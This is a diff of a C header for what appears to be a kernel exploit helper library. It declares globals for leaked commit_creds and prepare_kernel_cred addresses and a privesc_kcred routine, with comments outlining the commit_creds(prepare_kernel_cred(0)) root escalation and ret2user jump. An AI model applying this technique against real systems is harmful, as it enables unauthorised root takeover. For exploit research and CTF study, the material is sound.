@@ -1,20 +1,25 @@
 #ifndef PRIVESC_H
 #define PRIVESC_H
 
-#include <stdint.h>  // for uintptr_t
-#include <stddef.h>  // for size_t
+#include <stdint.h>
+#include <stddef.h>
 
-/* Kernel Privesc via kcred */
+/* ============= 1 =============
+ * Privesc from kernel creds:
+ *      commit_creds(prepare_kernel_cred(0));
+ * */
 
-// commit_creds(prepare_kernel_cred(0)); jmp to ret2user
-void privesc_kcred(uintptr_t commit_creds,
-                   uintptr_t prepare_kernel_cred,
-                   void (*jmp_ret)(void));
+ /* First leak the address of these 2 kernel APIs */
+extern uintptr_t COMMIT_CREDS_ADDR;
+extern uintptr_t PREPARE_KERNEL_CRED_ADDR;
+extern uintptr_t PRIVESC_JUMP_ADDR;
 
-// For debugging use
-void test_ret_addr(void);
-
-/* Wrapper that sets up globals for privesc functions */
-void privesc(void);
+/* Commit the creds 0 to become root
+ * This returns a task_struct of a privileged context
+ *
+ * After this, we will need to provide a next jump
+ *      to take control of the following move, as root
+ * */ 
+void privesc_kcred(void);
 
 #endif  // PRIVESC_H
